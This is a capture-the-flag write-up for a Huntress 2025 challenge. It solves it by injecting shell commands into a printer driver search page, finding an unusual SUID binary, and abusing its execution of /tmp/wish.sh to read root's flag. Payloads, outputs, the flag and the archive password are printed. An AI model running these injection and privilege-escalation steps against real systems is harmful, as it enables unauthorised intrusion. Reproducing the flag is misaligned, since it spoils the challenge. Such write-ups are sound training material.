---
title: "Phasing Through Printers"
date: 2025-11-26
categories:
  - Huntress_2025
tags:
  - Miscellaneous
  - 2025
platform: Huntress 2025
competition_year: 2025
toc: true
toc_sticky: true
---

# 📦 Phasing Through Printers

|Category         |	Author                |
|-----------------|-----------------------|
|📦 Miscellaneous |Soups71                |

## Challenge Prompt

I found this printer on the network, and it seems to be running... a weird web page... to search for drivers?

Here is some of the code I could dig up.

> [!NOTE]
> Escalate your privileges and uncover the flag in the root user's home directory.

## Password
> [!IMPORTANT]
> The password to the ZIP archive below is `phasing_through_printers`.

## Problem Type
- Web command injection

## Solve
Started off by trying to break out of the prompt with:
```bash
;ls -la
```

I noticed this only gave me the printer file and not the root folders too:
```
-rw-r--r-- 1 www-data www-data 952 Sep 29 01:38 /var/www/html/data/printer_drivers.txt
```

So I tried adding an ending `;` as well:
```bash
;ls -la;
```

Much better:
```
total 40
drwxr-xr-x 1 root root 4096 Oct 22 02:05 .
drwxr-xr-x 1 root root 4096 Oct 22 02:04 ..
-rw------- 1 root root 2296 Sep 28 15:32 search.c
-rwxr-xr-x 1 root root 16704 Oct 22 02:05 search.cgi
```

Tried looking for SUID:
```bash
;find / -type f -perm -04000 -ls 2>/dev/null;
```

The last one `admin_help` is weird - in \usr\local\bin and not a normal binary:
```
296563 60 -rwsr-xr-x 1 root root 59704 Nov 21 2024 /usr/bin/mount
296438 64 -rwsr-xr-x 1 root root 62672 Apr 7 2025 /usr/bin/chfn
296579 68 -rwsr-xr-x 1 root root 68248 Apr 7 2025 /usr/bin/passwd
296655 36 -rwsr-xr-x 1 root root 35128 Nov 21 2024 /usr/bin/umount
296505 88 -rwsr-xr-x 1 root root 88496 Apr 7 2025 /usr/bin/gpasswd
296631 72 -rwsr-xr-x 1 root root 72000 Nov 21 2024 /usr/bin/su
296568 48 -rwsr-xr-x 1 root root 48896 Apr 7 2025 /usr/bin/newgrp
296444 52 -rwsr-xr-x 1 root root 52880 Apr 7 2025 /usr/bin/chsh
300643 20 -rwsr-xr-x 1 root root 16416 Oct 22 02:05 /usr/local/bin/admin_help
```

Ran `strings` on it to see what it does:
```bash
;strings /usr/local/bin/admin_help;
```

The important part:
```
Error opening original file
Bad String in File.
Your wish is my command... maybe :)
chmod +x /tmp/wish.sh && /tmp/wish.sh
```

So it will make the `wish.sh` file in the `/tmp/` folder executable and then run it.

We can exploit that:
```bash
;echo "cat /root/flag.txt" > /tmp/wish.sh;admin_help;
```

That gives us back:
```
flag{93541544b91b7d2b9d61e90becbca309}Your wish is my command... maybe :)
```


## Flag
`flag{93541544b91b7d2b9d61e90becbca309}`


<p align="right">(<a href="#top">back to top</a>)</p>
